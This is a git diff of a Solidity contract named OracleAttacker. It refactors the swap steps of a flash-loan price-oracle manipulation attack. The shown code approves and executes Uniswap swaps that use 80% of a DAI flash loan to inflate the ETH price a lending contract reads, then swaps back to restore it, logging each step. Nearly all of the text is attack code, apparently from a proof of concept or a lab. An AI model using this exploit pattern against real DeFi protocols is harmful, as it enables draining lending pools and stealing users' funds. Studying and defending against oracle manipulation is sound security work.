@@ -113,16 +113,17 @@ contract OracleAttacker {
         console.log("[STEP 2] Swapping DAI -> WETH to push ETH price UP...");
         uint256 daiToSwap = (amounts[0] * 80) / 100; // Use 80% of flash loan
         console.log("  Swapping:", daiToSwap / 1e18, "DAI -> WETH");
+        // Approve router
         IERC20(DAI).approve(address(uniswapRouter), daiToSwap);
-
-        address[] memory pathDAItoWETH = new address[](2);
-        pathDAItoWETH[0] = DAI;
-        pathDAItoWETH[1] = WETH;
-
+        // Build path
+        address[] memory path = new address[](2);
+        path[0] = DAI;
+        path[1] = WETH;
+        // Execute swap
         uint256[] memory amountsOut = uniswapRouter.swapExactTokensForTokens(
             daiToSwap,
             0, // Accept any amount
-            pathDAItoWETH,
+            path,
             address(this),
             block.timestamp
         );
@@ -162,15 +163,13 @@ contract OracleAttacker {
         uint256 wethBalance = IERC20(WETH).balanceOf(address(this));
         console.log("  Current WETH balance:", wethBalance / 1e18, "WETH");
         console.log("  Swapping back to restore price...");
+        // Approve router
         IERC20(WETH).approve(address(uniswapRouter), wethBalance);
-
-        address[] memory pathWETHtoDAI = new address[](2);
-        pathWETHtoDAI[0] = WETH;
-        pathWETHtoDAI[1] = DAI;
-
-        uniswapRouter.swapExactTokensForTokens(
-            wethBalance, 0, pathWETHtoDAI, address(this), block.timestamp
-        );
+        // Build path
+        path[0] = WETH;
+        path[1] = DAI;
+        // Execute swap
+        uniswapRouter.swapExactTokensForTokens(wethBalance, 0, path, address(this), block.timestamp);
 
         uint256 priceFinal = lending.getETHPrice();
         console.log("  Price after restoration:", priceFinal / 1e18, "DAI per ETH\n");
